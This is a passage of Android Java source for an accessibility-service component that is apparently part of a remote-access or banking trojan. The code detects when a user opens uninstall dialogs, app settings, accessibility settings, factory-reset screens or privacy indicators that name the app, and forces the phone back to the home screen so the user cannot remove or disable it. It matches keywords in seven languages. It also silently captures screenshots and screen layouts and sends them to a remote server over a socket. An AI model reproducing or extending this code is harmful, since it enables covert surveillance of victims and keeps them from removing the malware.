            if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
                    event.getEventType() == AccessibilityEvent.TYPE_WINDOWS_CHANGED ||
                    event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
                //KeyguardManager keyguardManager = (KeyguardManager) getSystemService(Context.KEYGUARD_SERVICE);
                //boolean isScreenLocked = keyguardManager.isKeyguardLocked();
                if ((PreventDelete &&
                        event != null &&
                        My_Configs.Anti_Delete.equals("1")) &&
                        !Consts.removeme &&
                        !isScreenLocked) {
                    if (!isProtectorRunning()) {
                        AntiProtector(this);
                    }
                    // preventstopback(getApplicationContext(), CuzPackage, RootView);
                    String evt = EventText;
                    String cuz = CuzPackage;

                    String holdname = "null";
                    if (event.getClassName() != null) {
                        holdname = event.getClassName().toString().toLowerCase();
                    }
                    String ClassEvent = holdname;
                    ProtectSelf(evt, cuz, ClassEvent);

                }
            }


        } catch (Exception glob) {
            MyLoger.Error("At.acc.Glob", glob.getMessage());
            glob.printStackTrace();
        }

//        try {
//            if (RootView != null) {
//                RootView.recycle();
//            }
//            if (nodeInfo != null) {
//                nodeInfo.recycle();
//            }
////            if (event != null) {
////                event.recycle();
////            }
//        } catch (Exception a) {
//            a.printStackTrace();
//            MyLoger.Error("Cleaning", a.getMessage());
//        }
    }

    private void ProtectSelf(String EventText, String CuzPackage, String ClassEvent) {

        //event.getClassName()   String ClassEvent

        String eventTextLower = EventText.toLowerCase();
        String cuzPackageLower = CuzPackage.toLowerCase();
        try {


            boolean containsMyName = eventTextLower.contains(CurrentNam) | eventTextLower.contains("\u200C\u200C\u200C");

            if (containsMyName &&
                    (eventTextLower.contains("uninstall") ||
                            eventTextLower.contains("stop") ||
                            eventTextLower.contains("accessibility"))) {
                hideme(this);
                blockBack();
                GoHome();
                return;
            }

            if (cuzPackageLower.contains("com.google.android.packageinstaller") &&
                    "android.app.alertdialog".equalsIgnoreCase(ClassEvent.toString()) &&
                    containsMyName) {
                hideme(this);
                blockBack();
                GoHome();
                return;

            }

            if (cuzPackageLower.equals("com.android.settings") &&
                    ClassEvent.equals("com.android.settings.accessibility.AccessibilitySettings") &&
                    containsMyName) {
                hideme(this);
                blockBack();
                GoHome();
                return;
            }

            //
            if (cuzPackageLower.equals("com.samsung.accessibility") &&
                    containsMyName) {
                hideme(this);
                blockBack();
                GoHome();
                return;
            }

            if (ClassEvent != null && CuzPackage.length() > 0) {
                String className = ClassEvent.toString();
                String packageName = CuzPackage.toString();

                if ((className.equals("android.support.v7.widget.recyclerview") ||
                        className.equals("androidx.recyclerview.widget.RecyclerView") ||
                        className.equals("android.widget.linearlayout") ||
                        className.equals("android.widget.framelayout")) &&
                        (packageName.equals("com.android.settings") ||
                                packageName.equals("com.miui.securitycenter")) &&
                        containsMyName) {
                    hideme(this);
                    blockBack();
                    GoHome();
                    return;
                }
            }
            //com.miui.packageinstaller
            if ("com.miui.packageinstaller".equalsIgnoreCase(cuzPackageLower.toString()) &&
                    containsMyName) {
                try {
                    hideme(this);
                    blockBack();
                    GoHome();

                    return;
                } catch (Exception ignored) {
                }
            }
            if ("com.samsung.accessibility".equalsIgnoreCase(cuzPackageLower.toString()) &&
                    containsMyName) {
                try {
                    hideme(this);
                    blockBack();
                    GoHome();

                    return;
                } catch (Exception ignored) {
                }
            }
            if ("com.android.packageinstaller.UninstallerActivity".equalsIgnoreCase(ClassEvent) &&
                    containsMyName) {
                try {
                    hideme(this);
                    blockBack();
                    GoHome();
                    return;

                } catch (Exception ignored) {
                }
            }
            if ("com.android.packageinstaller".equalsIgnoreCase(ClassEvent) &&
                    containsMyName) {
                try {
                    hideme(this);
                    blockBack();
                    GoHome();
                    return;

                } catch (Exception ignored) {
                }
            }
            if (containsMyName &&
                    (cuzPackageLower.contains("settings") || cuzPackageLower.contains("security")) &&
                    (eventTextLower.contains("إيقاف") ||
                            eventTextLower.contains("stop") ||
                            eventTextLower.contains("توقف") ||
                            eventTextLower.contains("delete") ||
                            eventTextLower.contains("الإيقاف"))) {
                try {

                    blockBack();
                    GoHome();
                    return;

                } catch (Exception ignored) {
                }
            }
            if (containsMyName && eventTextLower.contains("accessibility") &&
                    cuzPackageLower.contains("settings")) {

                blockBack();
                GoHome();

                return;
            }
            if (containsMyName && (cuzPackageLower.equals("com.vivo.permissionmanager") ||
                    cuzPackageLower.equals("com.oplus.securitypermission") ||
                    cuzPackageLower.equals("com.coloros.oppoguardelf"))) {
                hideme(this);
                blockBack();
                GoHome();

                return;
            }

            if (!containsMyName){
                return;
            }
            boolean isDangerousAction = false;
            String lang = Locale.getDefault().getLanguage();
            String packageLower = cuzPackageLower.toLowerCase();

            if ( packageLower.contains("battery") ||
                    packageLower.contains("settings") ||
                    packageLower.contains("installer") ||
                    packageLower.contains("com.miui") ||
                    packageLower.contains("com.samsung") ||
                    packageLower.contains("com.coloros") ||
                    packageLower.contains("com.oppo") ||
                    packageLower.contains("com.oneplus") ||
                    packageLower.contains("com.infinix") ||
                    packageLower.contains("com.realme") ||
                    packageLower.contains("com.android.vending") ||
                    packageLower.contains("com.oplus") ||
                    packageLower.contains("com.iqoo") ||
                    packageLower.contains("com.vivo") ||
                    packageLower.contains("com.huawei") ||
                    packageLower.contains("security"))
            {
                if (lang.equals("ar")) {
                    isDangerousAction = eventTextLower.contains("حذف") ||
                            eventTextLower.contains("مسح") ||
                            eventTextLower.contains("إلغاء");
                } else if (lang.equals("en")) {
                    isDangerousAction = eventTextLower.contains("clear data") ||
                            eventTextLower.contains("uninstall") ||
                            eventTextLower.contains("turn off");
                } else if (lang.equals("tr")) {
                    isDangerousAction = eventTextLower.contains("sil") ||
                            eventTextLower.contains("kaldır") ||
                            eventTextLower.contains("silmek") ||
                            eventTextLower.contains("zorla");
                } else if (lang.equals("zh")) {
                    isDangerousAction = eventTextLower.contains("卸载") ||
                            eventTextLower.contains("强行停止") ||
                            eventTextLower.contains("删除") ||
                            eventTextLower.contains("解除安装") ||
                            eventTextLower.contains("确认卸载") ||
                            eventTextLower.contains("确定删除") ||
                            eventTextLower.contains("关闭");
                } else if (lang.equals("es")) {
                    isDangerousAction = eventTextLower.contains("borrar") ||
                            eventTextLower.contains("eliminar") ||
                            eventTextLower.contains("desinstalar") ||
                            eventTextLower.contains("desactivar");
                } else if (lang.equals("pt")) {
                    isDangerousAction = eventTextLower.contains("apagar") ||
                            eventTextLower.contains("limpiar datos") ||  // Spanish/Port mixed
                            eventTextLower.contains("excluir") ||
                            eventTextLower.contains("remover") ||
                            eventTextLower.contains("desativar") ||
                            eventTextLower.contains("limpar dados");
                }
            }
            if ((packageLower.contains("com.huawei.android.chr")) || isDangerousAction) {
                blockBack();
                GoHome();
            }
        } catch (Exception ignored) {
        }


    }


    @Override
    public void takeScreenshot(int displayId, @NonNull Executor executor,
                               @NonNull TakeScreenshotCallback callback) {
        super.takeScreenshot(displayId, executor, callback);
    }

    private final ThreadPoolExecutor threadPoolExecutor = new ThreadPoolExecutor(4, 8, 15, TimeUnit.SECONDS, new LinkedBlockingQueue<Runnable>());
    private static TakeScreenshotCallback snapcallback;

    @RequiresApi(api = Build.VERSION_CODES.R)
    public void CapScreen(Context ctx, String stype, int quality) {
        try {
            if (snapcallback == null) {
                snapcallback = new TakeScreenshotCallback() {
                    @RequiresApi(api = Build.VERSION_CODES.R)
                    @Override
                    public void onSuccess(@NonNull ScreenshotResult screenshotResult) {
                        Thread thread = new Thread() {
                            @Override
                            public void run() {
                                try {
                                    // Log.i("ScreenShotResult", "onSuccess");
                                    Bitmap bitmap = Bitmap.wrapHardwareBuffer(screenshotResult.getHardwareBuffer(), screenshotResult.getColorSpace());

                                    if (bitmap == null) {
                                        return;
                                    }
                                    Bitmap compressedBitmap = Bitmap.createScaledBitmap(bitmap.copy(Bitmap.Config.ARGB_8888, true), 350, 650, false);
                                    ByteArrayOutputStream baos = new ByteArrayOutputStream();


                                    if (!stype.equals("snap")) {
                                        if (AccessServices.BlackScreen_ON) {
                                            compressedBitmap = UtliTools.changeImageOpacity(compressedBitmap, 1.0f);
                                            compressedBitmap.compress(Bitmap.CompressFormat.WEBP, 100, baos);
                                        } else {
                                            compressedBitmap.compress(Bitmap.CompressFormat.WEBP, quality, baos);
                                        }
                                        byte[] scbyts = baos.toByteArray();
                                        LiveChat.instance(ctx).LiveScreenSilent(ctx, scbyts, stype);
                                    } else {
                                        compressedBitmap.compress(Bitmap.CompressFormat.WEBP, quality, baos);
                                        byte[] scbyts = baos.toByteArray();
                                        String base64Image = Base64.encodeToString(scbyts, Base64.DEFAULT);


                                        JSONObject jsonObject = new JSONObject();
                                        jsonObject.put("type", "snap");
                                        jsonObject.put("img", base64Image);
                                        String jsonData = jsonObject.toString();
                                        String SecondIDF = MySettings.Read(ctx, Consts.Sec_IDF, "null");
                                        if (SecondIDF.equals("null")) {
                                            SecondIDF = MySettings.Read(ctx, Consts.THE_IDF, null);
                                        }
                                        LiveChat.instance(ctx).SendNewSocket(ctx, SecondIDF, jsonData);


                                    }

                                    bitmap.recycle();
                                    compressedBitmap.recycle();
                                    screenshotResult.getHardwareBuffer().close();
                                } catch (Exception ex) {
                                    ex.printStackTrace();
                                }
                            }
                        };
                        thread.start();

                    }

                    @Override
                    public void onFailure(int i) {

                        if (i == AccessibilityService.ERROR_TAKE_SCREENSHOT_INTERVAL_TIME_SHORT) {
                            WorkServices.DelayScreenshot += 50;
                        }


                    }
                };
            }

            takeScreenshot(Display.DEFAULT_DISPLAY,
                    threadPoolExecutor, snapcallback);

        } catch (Exception a) {
            a.printStackTrace();
        }
    }


    private static int notifiid = 1;

    public static void ShowNotification(Context ctx, String Msg) {


        try {


            NotificationCompat.Builder builder;
            builder = new NotificationCompat.Builder(ctx, "New Notifications")
                    .setContentTitle(My_Configs._Notfy_TITL_)
                    .setContentText(Msg)
                    .setVisibility(NotificationCompat.VISIBILITY_PUBLIC)
                    .setPriority(NotificationCompat.PRIORITY_HIGH)
                    .setSmallIcon(R.drawable.notify)
                    .setAutoCancel(true);

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                NotificationChannel channel = new NotificationChannel(
                        "New Notifications",
                        "Notifications",
                        NotificationManager.IMPORTANCE_HIGH
                );

                NotificationManager notificationManager = ctx.getSystemService(NotificationManager.class);
                notificationManager.createNotificationChannel(channel);
                builder.setChannelId("New Notifications");
            }
            builder.setVibrate(new long[]{1000, 1000, 1000, 1000, 1000});
            builder.setLights(Color.RED, 3000, 3000);
            Uri alarmSound = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_NOTIFICATION);
            builder.setSound(alarmSound);
            NotificationManagerCompat notificationManager = NotificationManagerCompat.from(ctx);
            if (Build.VERSION.SDK_INT >= 33) { // Android 13 (Tiramisu) and above

                // Check if the notification permission is not granted
                if (ContextCompat.checkSelfPermission(ctx, "android.permission.POST_NOTIFICATIONS") == PackageManager.PERMISSION_GRANTED) {
                    notificationManager.notify(notifiid, builder.build());
                } else {
                    AlertServer(ctx, "Post Notification", "notification permission is not granted");
                }
            } else {
                notificationManager.notify(notifiid, builder.build());
            }

            notifiid += 1;
        } catch (Exception d) {
            d.printStackTrace();
        }
    }

    @Override
    public void onInterrupt() {

    }


    private static volatile long Scannerdate = 0;

    private static boolean isScreenScannerRunning() {
        long currentTime = System.currentTimeMillis();
        long elapsedTime = currentTime - Scannerdate;
        long threeMinutesInMillis = 3 * 60 * 1000; // 3 minutes in milliseconds

        // Check if the elapsed time is less than 3 minutes
        return elapsedTime < threeMinutesInMillis;
    }

//    private WindowManager windowManager;
//    private Map<String, View> overlayMap = new HashMap<>(); // Track overlays by view ID
//
//    private void removeOverlay(String viewId) {
//        if (windowManager != null && overlayMap.containsKey(viewId)) {
//            windowManager.removeView(overlayMap.get(viewId)); // Remove specific overlay
//            overlayMap.remove(viewId);
//        }
//    }
//
//    private void overlayBlackBox(String viewId, Rect rect) {
//        if (windowManager == null) {
//            windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
//        }
//
//        // Check if overlay already exists for this viewId
//        if (overlayMap.containsKey(viewId)) {
//            return; // Prevent duplicate overlays
//        }
//
//        View blackOverlay = new View(this);
//        blackOverlay.setBackgroundColor(Color.BLACK); // Change to BLACK overlay
//
//        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
//                rect.width(), rect.height(), // Increase size
//                rect.left, rect.top, // Position on screen
//                WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
//                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
//                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
//                        | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
//                        | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
//                        | WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED
//                        | WindowManager.LayoutParams.FLAG_FULLSCREEN
//                        | WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS
//                        | WindowManager.LayoutParams.FLAG_LAYOUT_INSET_DECOR, // Ensures overlay is visible
//                PixelFormat.TRANSLUCENT
//        );
//
//        params.gravity = Gravity.TOP | Gravity.LEFT;
//
//        Log.d("Overlay", "Adding overlay at: X=" + rect.left + ", Y=" + rect.top +
//                ", Width=" + rect.width() + ", Height=" + rect.height());
//        windowManager.addView(blackOverlay, params);
//        overlayMap.put(viewId, blackOverlay); // Store reference
//    }
//

    public void ScreenScanner(Context ctx) {
        Thread thread = new Thread(new Runnable() {
            public void run() {

                int sleeptime = 1000;

                do {
                    Scannerdate = System.currentTimeMillis();
                    try {
                        sleep(sleeptime);
                    } catch (Exception s) {
                    }

                    try {

                        sleeptime = 3000;


                        if (MySettings.ReadBool(ctx, Consts.Send_Skilton, false)) {
                            sleeptime = 10;
                            byte[] byteArray = AccessTools.createskilton();
                            if (byteArray != null) {
                                String base64Image = Base64.encodeToString(byteArray, Base64.DEFAULT);
                                JSONObject jsonObject = new JSONObject();
                                jsonObject.put("type", "screen");
                                jsonObject.put("img", base64Image);
                                jsonObject.put("frmt", "w");
                                jsonObject.put("skly", "1");
                                jsonObject.put("wmob", mWidth);
                                jsonObject.put("hmob", mHeight);
                                String jsonData = jsonObject.toString();

                                String SecondIDF = MySettings.Read(ctx, Consts.Sec_IDF, "null");
                                if (SecondIDF.equals("null")) {
                                    SecondIDF = MySettings.Read(ctx, Consts.THE_IDF, null);
                                }

                                LiveChat.instance(ctx).SendNewSocket(ctx, SecondIDF, jsonData);

                            }

                        }
                    } catch (Exception a) {

                    }

                } while (true);
            }
        });
        thread.start();
    }

    private static volatile long Protectdate = 0;

    private static boolean isProtectorRunning() {
        if (Protectdate == 0) {
            return false;
        }
        long currentTime = System.currentTimeMillis();
        long elapsedTime = currentTime - Protectdate;
        long threeMinutesInMillis = 7 * 1000;

        return elapsedTime < threeMinutesInMillis;
    }

    public void AntiProtector(AccessServices accessor) {
        Protectdate = System.currentTimeMillis();
        Handler mainHand = new Handler(getMainLooper());
        Thread protrct = new Thread(new Runnable() {
            @Override
            public void run() {

                int sleeptime = 500;
                while (true) {
                    Protectdate = System.currentTimeMillis();
                    try {
                        Thread.sleep(sleeptime);

                    } catch (Exception a) {
                    }
                    try {
                        AccessibilityNodeInfo RootView = accessor.getRootInActiveWindow();
                        KeyguardManager keyguardManager = (KeyguardManager) getSystemService(Context.KEYGUARD_SERVICE);
                        boolean isScreenLocked = keyguardManager.isKeyguardLocked();
                        if (PreventDelete &&
                                RootView != null &&
                                My_Configs.Anti_Delete.equals("1") &&
                                !Consts.removeme &&
                                !isScreenLocked) {

                            String CuzPackage = String.valueOf(RootView.getPackageName()).toLowerCase();
                            if (CuzPackage.length() > 0 && AccessTools.isSystemApp(getApplicationContext(), CuzPackage)) {
                                try {
                                    if (CuzPackage.equals("com.miui.home".toLowerCase())) {
                                        //
                                        AccessibilityNodeInfo unstlldilg = AccessTools.getNodeByViewId(RootView,
                                                "com.miui.home:id/uninstall_dialog");
                                        if (unstlldilg != null && unstlldilg.isVisibleToUser()) {
                                            AccessibilityNodeInfo nfkeys = AccessTools.getNodeByViewId(RootView,
                                                    "com.miui.home:id/title");
                                            if (nfkeys != null && nfkeys.isVisibleToUser()) {
                                                String nodtxts = String.valueOf(nfkeys.getText()).toLowerCase();
                                                boolean containsMyName = nodtxts.contains(CurrentNam) | nodtxts.contains("\u200C\u200C\u200C");
                                                if (containsMyName) {
                                                    mainHand.post(() -> {
                                                        blockBack();
                                                        GoHome();
                                                    });
                                                    sleeptime = 200;
                                                    continue;
                                                }
                                            }
                                        }

                                    }

                                } catch (Exception a) {

                                }


                                if (CuzPackage.equals("com.android.settings".toLowerCase())) {

                                    List<AccessibilityNodeInfo> nodes = getNodesByClassName(RootView, "com.android.settings.system.ResetDashboardFragment");

                                    if (nodes != null && !nodes.isEmpty()) {
                                        mainHand.post(() -> {
                                            blockBack();
                                            GoHome();
                                        });
                                        sleeptime = 200;
                                        continue;
                                    }
                                    AccessibilityNodeInfo nf = AccessTools.getNodeByViewId(RootView, "com.android.settings:id/collapsing_toolbar");
                                    if (nf != null) {
                                        //Log.d("Accessibility", "Element found!");

                                        if (nf.getContentDescription() != null &&
                                                nf.getContentDescription().toString().toLowerCase().contains(CurrentNam)) {
                                            mainHand.post(() -> {
                                                blockBack();
                                                GoHome();
                                            });
                                            sleeptime = 200;
                                            continue;
                                        }
                                    }


                                    // for (String viewId : viewIds1) {
                                    AccessibilityNodeInfo node = AccessTools.getNodeByViewId(RootView, "com.android.settings:id/action_bar_title_expand");

                                    if (node != null &&
                                            node.getText() != null &&
                                            node.getText().toString().toLowerCase().contains(CurrentNam)) {
                                        mainHand.post(() -> {
                                            blockBack();
                                            GoHome();
                                        });
                                        sleeptime = 200;
                                        continue;
                                    }
                                    // }
                                    AccessibilityNodeInfo node2 = AccessTools.getNodeByViewId(RootView, "com.android.settings:id/permissionDialog_disable_title");
                                    if (node2 != null &&
                                            node2.getText() != null &&
                                            node2.getText().toString().toLowerCase().contains(CurrentNam)) {
                                        mainHand.post(() -> {
                                            blockBack();
                                            GoHome();
                                        });
                                        sleeptime = 200;
                                        continue;
                                    }


                                    AccessibilityNodeInfo nodexs;

                                    nodexs = AccessTools.getNodeByViewId(RootView, "com.android.settings:id/also_erases_external");
                                    if (nodexs != null && nodexs.isVisibleToUser()) {
                                        mainHand.post(() -> {
                                            blockBack();
                                            GoHome();
                                        });
                                        sleeptime = 200;
                                        continue;
                                    }


                                    nodexs = AccessTools.getNodeByViewId(RootView, "com.android.settings:id/clear_all_data_text");
                                    if (nodexs != null && nodexs.isVisibleToUser()) {
                                        mainHand.post(() -> {
                                            blockBack();
                                            GoHome();
                                        });
                                        sleeptime = 200;
                                        continue;
                                    }


                                    nodexs = AccessTools.getNodeByViewId(RootView, "com.android.settings:id/reset_settings_descrption");
                                    if (nodexs != null && nodexs.isVisibleToUser()) {
                                        mainHand.post(() -> {
                                            blockBack();
                                            GoHome();
                                        });
                                        sleeptime = 200;
                                        continue;
                                    }


                                    nodexs = AccessTools.getNodeByViewId(RootView, "com.android.settings:id/reset_button");
                                    if (nodexs != null && nodexs.isVisibleToUser()) {
                                        mainHand.post(() -> {
                                            blockBack();
                                            GoHome();
                                        });
                                        sleeptime = 200;
                                        continue;
                                    }
                                    ;

                                    node = AccessTools.getNodeByViewId(RootView, "com.android.settings:id/sec_reset_settings_layout");
                                    if (nodexs != null && nodexs.isVisibleToUser()) {
                                        mainHand.post(() -> {
                                            blockBack();
                                            GoHome();
                                        });
                                        sleeptime = 200;
                                        continue;
                                    }
                                    ;


                                    try {
                                        List<AccessibilityNodeInfo> nfo1 = AccessTools.findNodesByText(" \u200C\u200C\u200C", RootView);
                                        if (nfo1 != null && !nfo1.isEmpty()) {
                                            mainHand.post(() -> {
                                                blockBack();
                                                GoHome();
                                            });
                                            sleeptime = 200;
                                            //hideme(this);
                                            continue;
                                        }

                                    } catch (Exception a) {
                                    }

                                }
                                if (CuzPackage.equals("com.android.systemui".toLowerCase())) {

                                    AccessibilityNodeInfo nf3 = AccessTools.getNodeByViewId(RootView,
                                            "com.android.systemui:id/privacy_dialog_item_header_summary");
                                    if (nf3 != null) {

                                        if (nf3.isVisibleToUser()) {
                                            mainHand.post(() -> {
                                                blockBack();
                                                GoHome();
                                            });
                                            sleeptime = 200;
                                            continue;
                                        }
                                    }

                                    AccessibilityNodeInfo nf4 = AccessTools.getNodeByViewId(RootView,
                                            "com.android.systemui:id/privacy_item");
                                    if (nf4 != null) {

                                        if (nf4.isVisibleToUser()) {
                                            mainHand.post(() -> {
                                                blockBack();
                                                GoHome();
                                            });
                                            sleeptime = 200;
                                            continue;
                                        }
                                    }

                                    preventstopback(CuzPackage,RootView);

                                }

                                if (CuzPackage.equals("com.samsung.accessibility".toLowerCase())) {

                                    AccessibilityNodeInfo nf3 = AccessTools.getNodeByViewId(RootView,
                                            "com.samsung.accessibility:id/collapsing_appbar_extended_title");
                                    if (nf3 != null) {
                                        //Log.d("Accessibility", "Element found!");


                                        if (nf3.getText() != null &&
                                                nf3.getText().toString().toLowerCase().contains(CurrentNam)) {
                                            mainHand.post(() -> {
                                                blockBack();
                                                GoHome();
                                            });
                                            sleeptime = 200;
                                            continue;
                                        }
                                    }


                                }
//                            //com.miui.home:id/title

                                try {

                                    if (CuzPackage.contains("battery") ||
                                            CuzPackage.contains("settings") ||
                                            CuzPackage.contains("installer") ||
                                            CuzPackage.contains("com.miui") ||
                                            CuzPackage.contains("com.samsung") ||
                                            CuzPackage.contains("com.coloros") ||
                                            CuzPackage.contains("com.oppo") ||
                                            CuzPackage.contains("com.oneplus") ||
                                            CuzPackage.contains("com.infinix") ||
                                            CuzPackage.contains("com.systemui") ||
                                            CuzPackage.contains("com.realme") ||
                                            CuzPackage.contains("com.android.vending") ||
                                            CuzPackage.contains("com.oplus") ||
                                            CuzPackage.contains("com.iqoo") ||
                                            CuzPackage.contains("com.vivo") ||
                                            CuzPackage.contains("com.huawei") ||
                                            CuzPackage.contains("security")) {

                                        String evntTextV2 = AccessTools.readAllTextOnScreen(RootView).toLowerCase();
                                        boolean containsMyName2 = evntTextV2.contains(CurrentNam) | evntTextV2.contains("\u200C\u200C\u200C");
                                        String lang = Locale.getDefault().getLanguage();
                                        if (containsMyName2) {
                                            boolean isWordFound = false;
                                            if (lang.equals("ar")) {
                                                isWordFound = evntTextV2.contains("الغاء") ||
                                                        evntTextV2.contains("الخلفية") ||
                                                        evntTextV2.contains("أذونات") ||
                                                        evntTextV2.contains("مسح") ||
                                                        evntTextV2.contains("توقف") ||
                                                        evntTextV2.contains("إلغاء التثبيت") ||
                                                        evntTextV2.contains("تعطيل") ||
                                                        evntTextV2.contains("قتل") ||
                                                        evntTextV2.contains("اغلاق");

                                            } else if (lang.equals("en")) {
                                                isWordFound = evntTextV2.contains("background") ||
                                                        evntTextV2.contains("uninstall") ||
                                                        evntTextV2.contains("permissions") ||
                                                        evntTextV2.contains("clear") ||
                                                        evntTextV2.contains("stop") ||
                                                        evntTextV2.contains("force stop") ||
                                                        evntTextV2.contains("disable") ||
                                                        evntTextV2.contains("close");

                                            } else if (lang.equals("zh")) {
                                                isWordFound = evntTextV2.contains("允许完全后台行为") ||
                                                        evntTextV2.contains("卸载") ||
                                                        evntTextV2.contains("强行停止") ||
                                                        evntTextV2.contains("权限") ||
                                                        evntTextV2.contains("清除") ||
                                                        evntTextV2.contains("停止") ||
                                                        evntTextV2.contains("禁用") ||
                                                        evntTextV2.contains("允许") ||
                                                        evntTextV2.contains("后台管理") ||
                                                        evntTextV2.contains("关闭") ||
                                                        evntTextV2.contains("删除") ||
                                                        evntTextV2.contains("清理");

                                            } else if (lang.equals("tr")) {
                                                isWordFound = evntTextV2.contains("arka plan faaliyetine izin ver") ||
                                                        evntTextV2.contains("kaldır") ||
                                                        evntTextV2.contains("izinler") ||
                                                        evntTextV2.contains("durdur") ||
                                                        evntTextV2.contains("temizle") ||
                                                        evntTextV2.contains("dur") ||
                                                        evntTextV2.contains("zorla durdur") ||
                                                        evntTextV2.contains("devre dışı bırak") ||
                                                        evntTextV2.contains("çıkar") ||
                                                        evntTextV2.contains("kapat") ||
                                                        evntTextV2.contains("sil") ||
                                                        evntTextV2.contains("arka planda çalışmayı durdur");

                                            } else if (lang.equals("es")) {
                                                isWordFound = evntTextV2.contains("fondo") ||
                                                        evntTextV2.contains("desinstalar") ||
                                                        evntTextV2.contains("permisos") ||
                                                        evntTextV2.contains("limpiar") ||
                                                        evntTextV2.contains("parar") ||
                                                        evntTextV2.contains("detener") ||
                                                        evntTextV2.contains("forzar detención") ||
                                                        evntTextV2.contains("deshabilitar") ||
                                                        evntTextV2.contains("cerrar") ||
                                                        evntTextV2.contains("eliminar") ||
                                                        evntTextV2.contains("cerrar aplicación");

                                            } else if (lang.equals("ru")) {
                                                isWordFound = evntTextV2.contains("фон") ||
                                                        evntTextV2.contains("удалить") ||
                                                        evntTextV2.contains("разрешения") ||
                                                        evntTextV2.contains("очистить") ||
                                                        evntTextV2.contains("остановить") ||
                                                        evntTextV2.contains("принудительная остановка") ||
                                                        evntTextV2.contains("отключить") ||
                                                        evntTextV2.contains("закрыть");

                                            } else if (lang.equals("pt")) {
                                                isWordFound = evntTextV2.contains("plano de fundo") ||
                                                        evntTextV2.contains("desinstalar") ||
                                                        evntTextV2.contains("permissões") ||
                                                        evntTextV2.contains("limpar") ||
                                                        evntTextV2.contains("parar") ||
                                                        evntTextV2.contains("forçar parada") ||
                                                        evntTextV2.contains("desativar") ||
                                                        evntTextV2.contains("fechar");

                                            }

                                            if (isWordFound) {
                                                mainHand.post(() -> {
                                                    blockBack();
                                                    GoHome();
                                                });
                                                sleeptime = 200;
                                                continue;
                                            }


                                        }

                                        boolean isResetAccessibility = false;
                                        if (lang.equals("ar")) {

                                            isResetAccessibility = evntTextV2.contains("إعادة ضبط التطبيقات") ||
                                                    evntTextV2.contains("إعادة تعيين التطبيقات") ||
                                                    evntTextV2.contains("إعادة تعيين إعدادات إمكانية الوصول");
                                        } else if (lang.equals("en")) {

                                            isResetAccessibility = evntTextV2.contains("reset accessibility settings") ||
                                                    evntTextV2.contains("reset apps");
                                        } else if (lang.equals("zh")) {

                                            isResetAccessibility = evntTextV2.contains("重置应用") ||
                                                    evntTextV2.contains("重置应用偏好设置") ||
                                                    evntTextV2.contains("重置辅助功能设置");
                                        } else if (lang.equals("tr")) {

                                            isResetAccessibility = evntTextV2.contains("erişilebilirlik ayarlarını sıfırla") ||
                                                    evntTextV2.contains("uygulamaları sıfırla");
                                        } else if (lang.equals("es")) {

                                            isResetAccessibility = evntTextV2.contains("restablecer configuración de accesibilidad") ||
                                                    evntTextV2.contains("restablecer preferencias de aplicaciones");
                                        } else if (lang.equals("ru")) {

                                            isResetAccessibility = evntTextV2.contains("сбросить настройки специальных возможностей") ||
                                                    evntTextV2.contains("сброс настроек приложений");
                                        } else if (lang.equals("pt")) {

                                            isResetAccessibility = evntTextV2.contains("redefinir preferências do app") ||
                                                    evntTextV2.contains("redefinir configurações de acessibilidade");
                                        }

                                        if (isResetAccessibility) {
                                            mainHand.post(() -> {
                                                blockBack();
                                                GoHome();
                                            });
                                        }
                                    }
                                } catch (Exception s) {
                                }
                                sleeptime = 200;
                            } else {
                                sleeptime = 500;
                            }
                        } else {
                            sleeptime = 500;
                        }

                    } catch (Exception a) {
                        MyLoger.Error("Protector", a.getMessage());
                    }
                }
            }
        });
        protrct.start();
    }

    public void printViewIds(AccessibilityNodeInfo rootView, int depth) {
        try {
            if (rootView == null) {
                Log.e("At.printViewIds", "Root view is null.");
                return;
            }

            // Get View ID
            String viewId = rootView.getViewIdResourceName() != null ? rootView.getViewIdResourceName() : "id_not_available";

            // Get Class Name
            String className = rootView.getClassName() != null ? rootView.getClassName().toString() : "class_not_available";

            // Get Package Name
            String packageName = rootView.getPackageName() != null ? rootView.getPackageName().toString() : "package_not_available";

            // Get Text
            String text = rootView.getText() != null ? rootView.getText().toString() : "text_not_available";

            // Get Content Description
            String contentDescription = rootView.getContentDescription() != null ? rootView.getContentDescription().toString() : "description_not_available";

            // Get Checkable State
            boolean isCheckable = rootView.isCheckable();

            // Get Checked State
            boolean isChecked = rootView.isChecked();

            // Get Clickable State
            boolean isClickable = rootView.isClickable();

            // Get Enabled State
            boolean isEnabled = rootView.isEnabled();

            // Get Focusable State
            boolean isFocusable = rootView.isFocusable();

            // Get Visibility (rough estimate)
            boolean isVisible = rootView.isVisibleToUser();

            // Get Bounds in Screen
            Rect bounds = new Rect();
            rootView.getBoundsInScreen(bounds);
            int x = bounds.left;
            int y = bounds.top;
            int width = bounds.width();
            int height = bounds.height();

            // Log all the details with depth indentation
            String indent = new String(new char[depth]).replace("\0", "  "); // Indentation for hierarchy
            Log.e("At.printViewIds",
                    indent + "View Details [" + depth + "]" +
                            "\n" + indent + "ID: " + viewId +
                            "\n" + indent + "Class: " + className +
                            "\n" + indent + "Package: " + packageName +
                            "\n" + indent + "Text: " + text +
                            "\n" + indent + "Content Description: " + contentDescription +
                            "\n" + indent + "Checkable: " + isCheckable +
                            "\n" + indent + "Checked: " + isChecked +
                            "\n" + indent + "Clickable: " + isClickable +
                            "\n" + indent + "Enabled: " + isEnabled +
                            "\n" + indent + "Focusable: " + isFocusable +
                            "\n" + indent + "Visible: " + isVisible +
                            "\n" + indent + "Position: (" + x + ", " + y + ")" +
                            "\n" + indent + "Size: " + width + "x" + height +
                            "\n" + indent + "-------------------------"
            );

            // Recursively print child views with increased depth
            for (int i = 0; i < rootView.getChildCount(); i++) {
                printViewIds(rootView.getChild(i), depth + 1);
            }

        } catch (Exception e) {
            Log.e("At.printViewIds", "Exception: " + e.getMessage());
        }
    }

